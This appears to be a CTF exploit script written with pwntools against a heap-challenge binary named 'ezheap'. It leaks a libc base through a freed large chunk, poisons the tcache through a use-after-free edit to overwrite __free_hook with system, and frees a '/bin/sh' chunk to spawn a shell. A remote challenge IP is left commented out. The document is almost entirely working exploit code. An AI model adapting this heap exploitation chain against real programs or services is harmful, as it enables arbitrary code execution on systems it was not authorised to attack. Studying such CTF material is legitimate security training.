# EXP
```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import *
from ctypes import *

context(os='linux', arch='amd64', log_level='debug')
p = process("/home/zp9080/PWN/ezheap")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b *$rebase(0x1A8F7)')
# p=remote('47.94.104.233',32788)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
elf = ELF("/home/zp9080/PWN/ezheap")
libc=elf.libc

def dbg():
    gdb.attach(p,'b *$rebase(0x1811)')
    pause()


menu=b'exit'
def add(idx,size,cont):
    p.sendlineafter(menu,str(1))
    p.sendlineafter("Idx:",str(idx))
    p.sendlineafter("Size:",str(size))
    p.sendafter("note",cont)

def delete(idx):
    p.sendlineafter(menu,str(2))
    p.sendlineafter("Idx:",str(idx))

def show(idx):
    p.sendlineafter(menu,str(3))
    p.sendlineafter("Idx:",str(idx))

def edit(idx,cont):
    p.sendlineafter(menu,str(4))
    p.sendlineafter("Idx:",str(idx))
    p.sendafter("note",cont)


add(0,0x420,b'a')       
add(1,0x20,b'a')
delete(0)
show(0)
libcbase=u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))-0x1ecbe0
print(hex(libcbase))
# pause()

free_hook=libcbase+libc.sym['__free_hook']
system_addr = libcbase + libc.symbols['system']
bin_addr = libcbase + next(libc.search(b'/bin/sh'))


add(2,0x60,b'a')
add(3,0x60,b'a')
delete(3)
delete(2)
dbg()
edit(2,p64(free_hook))


add(2,0x60,b'/bin/sh\x00')
add(3,0x60,p64(system_addr))
delete(2)



p.interactive()
```